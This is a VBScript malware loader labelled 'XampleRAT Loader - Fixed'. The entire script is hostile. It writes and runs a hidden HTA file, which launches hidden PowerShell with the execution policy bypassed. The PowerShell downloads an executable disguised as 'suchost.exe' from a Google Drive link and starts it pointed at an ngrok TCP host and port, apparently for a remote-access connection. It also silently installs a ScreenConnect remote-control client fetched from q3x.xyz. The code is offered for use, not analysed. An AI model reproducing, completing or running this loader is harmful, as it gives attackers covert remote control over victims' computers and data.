' XampleRAT Loader - Fixed
Dim ngrokHost, ngrokPort
ngrokHost = "6.tcp.eu.ngrok.io"
ngrokPort = "29209"

Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Dim tempHta, tempDir
tempDir = sh.ExpandEnvironmentStrings("%public%")
tempHta = tempDir & "\UpdateTask.hta"

' URLs and paths
Dim url1, path1, url2, path2
url1 = "https://drive.usercontent.google.com/uc?id=1ETcfABGb0REk3m4BCf89x4W5xxN_6m_J&export=download"
path1 = tempDir & "\suchost.exe"
url2 = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi"
path2 = tempDir & "\screenconnect.msi"

' FIXED: Commands properly concatenated without breaking inside quotes
Dim c1, c2
c1 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
     "$u='" & url1 & "';$p='" & path1 & "';curl.exe -L -s -o $p $u;" & _
     "Start-Process -FilePath $p -ArgumentList '" & ngrokHost & "','" & ngrokPort & "' -WindowStyle Hidden"

c2 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
     "$u2='" & url2 & "';$p2='" & path2 & "';curl.exe -L -s -o $p2 $u2;" & _
     "Start-Process -FilePath $p2 -WindowStyle Hidden"

' Create the HTA file
Dim f
Set f = fso.CreateTextFile(tempHta, True)
f.WriteLine "<html><head><script language=""VBScript"">"
f.WriteLine "Set ws = CreateObject(""WScript.Shell"")"
' Use Replace to ensure quotes inside the strings don't break the HTA write
f.WriteLine "c1 = """ & Replace(c1, """", """""") & """"
f.WriteLine "c2 = """ & Replace(c2, """", """""") & """"
f.WriteLine "ws.Run c1, 0, False"
f.WriteLine "ws.Run c2, 0, False"
f.WriteLine "window.close()"
f.WriteLine "</script></head></html>"
f.Close

' Execute the HTA
sh.Run "mshta.exe """ & tempHta & """", 0, True
